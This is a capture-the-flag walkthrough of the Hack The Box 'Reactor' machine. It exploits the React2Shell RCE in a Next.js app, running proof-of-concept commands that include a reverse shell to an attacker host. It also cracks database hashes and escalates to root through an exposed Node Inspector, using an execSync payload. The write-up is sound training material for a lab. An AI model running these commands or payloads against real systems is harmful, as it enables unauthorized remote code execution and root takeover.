# Reactor | Hack-The-Box | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [HTB Reactor](https://app.hackthebox.com/machines/Reactor?sort_by=created_at&sort_type=desc)          |
| Difficulty        | Medium                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             | nmap, crackstation, [React2Shell](https://p3ta00.github.io/cve-2025-55182-react2shell-rce/), wscat.  |

# Reconnaissance

Scan the target machine to identify open ports and running services. 
```
nmap -A -T4 <ip address>
```
The initial Nmap scan identifies two open ports:
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 3000/tcp    | http(Next.js application)          |


# Enumeration

Browsing to `http://target-IP:3000/` presents a static page titled "ReactorWatch Core Monitoring System", which appears to be a dashboard for monitoring industrial reactor metrics.<br>
Inspecting the page source reveals the following technology stack: 
- Framework: next.js 
- React Server Components (RSC) enabled and actively interacting with the server

Directory brute-forcing, fuzzing, and subdomain enumeration did not uncover any additional attack surface.<br>
Given that the application uses React Server Components and server-side actions, the next step is to investigate publicly known vulnerabilities affecting this technology stack.

## Foothold
Vulnerability: CVE-2025–55182 (React2Shell):<br>
The React2Shell vulnerability (CVE-2025–55182) is a critical pre-authentication Remote Code Execution (RCE) flaw affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, it allows attackers to execute arbitrary code on a vulnerable server via a single malicious HTTP request, without authentication.<br>
The flaw stems from improper validation of serialized payloads in the Flight protocol used by React Server Components. Malicious payloads can trigger prototype pollution and lead to Node.js code execution. This impacts both Linux and Windows environments, including containerized deployments.<br>

### why it applies to this target:-
Because the application exposes React Server Components over Next.js and processes serialized Flight requests, it is susceptible to CVE-2025-55182, allowing unauthenticated remote code execution via crafted payloads.

# Exploitation
To exploit the identified vulnerability, we can use the publicly available [React2Shell](https://p3ta00.github.io/cve-2025-55182-react2shell-rce/) proof-of-concept.<br>
The exploitation workflow is as follows: <br>
- CVE-2025–55182: React2Shell — Unauthenticated RCE in React Server Components | p3ta@dc710
```
#check vulnerability
 python3 react2shell-poc.py -t http://Target-IP:3000 --check

#check command execution
python3 react2shell-poc.py -t http://Target-IP:3000 -c "id" --listen --lhost Attacker-IP

# Set up a reverse shell
python3 react2shell-poc.py -t http://Target-IP:3000 --revshell --lhost Attacker-IP --lport 4444
```

After obtaining a shell as the node user, enumerate the filesystem for sensitive files. During this process, a `SQLite3 database` is discovered.<br>
Examining the database reveals stored user credentials, including password hashes. These hashes can be cracked using `CrackStation`.

The recovered credentials are:<br>
- username: engineer
- password: reactor1 

# Initial Access
Use the recovered credentials to establish an SSH session as the `engineer` user.
```
ssh engineer@Target-IP
```
<b>The user flag is located at:<br>`/home/engineer/user.txt`</b>

# Privilege Escalation

Enumerating running processes reveals a Node.js application executing as `root` with the Inspector interface enabled:
```
root /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
This means:
- Node is running as root
- The Node debugger (Inspector) is enabled
- The debugger listens on port 9229

The Inspector protocol is intended for debugging Node.js applications but can be abused to execute arbitrary JavaScript when exposed to an attacker.<br>

The Inspector service is bound to `127.0.0.1:9229`, making it accessible only from the local machine. To interact with it remotely, create an SSH local port forward that exposes the service on the attacker's system.
```
-> First up, we create an SSH tunnel 
# Attacker terminal
ssh -L 9229:127.0.0.1:9229 engineer@Target-IP
```
```
-> Next, retrieve the active WebSocket debugger endpoint: 
# Target Terminal
curl http://127.0.0.1:9229/json
```
```
#You will get something similar to this
[
  {
    "id":"7f8f8f4a-3c65-4c55-b9a7-f7f7e8a9a123",
    "title":"worker.js",
    "webSocketDebuggerUrl":"ws://127.0.0.1:9229/7f8f8f4a-3c65-4c55-b9a7-f7f7e8a9a123"
  }
]
We need “ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123”
```
```
-> Connect to the Inspector interface using `wscat`:
# Attacker Terminal
npm install -g wscat
```
```
# Attacker Terminal
wscat -c ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123
```
```
# Send the following Runtime.evaluate request to execute JavaScript within the privileged Node.js process: 
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
    "returnByValue": true
  }
}
```

The payload should be sent as a single-line JSON object: 
```
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```

<b>The response contains the contents of /root/root.txt, successfully disclosing the root flag.</b><br>
For the purposes of this walkthrough, the interaction was limited to reading the root flag.<br>
The same Inspector interface could be used to execute arbitrary commands or spawn a privileged shell, demonstrating the severity of the misconfiguration. 

Root flag & User Flag found!<br>
I hope this walkthrough was clear, informative, and easy to follow.<br>

Happy Hacking ~!!!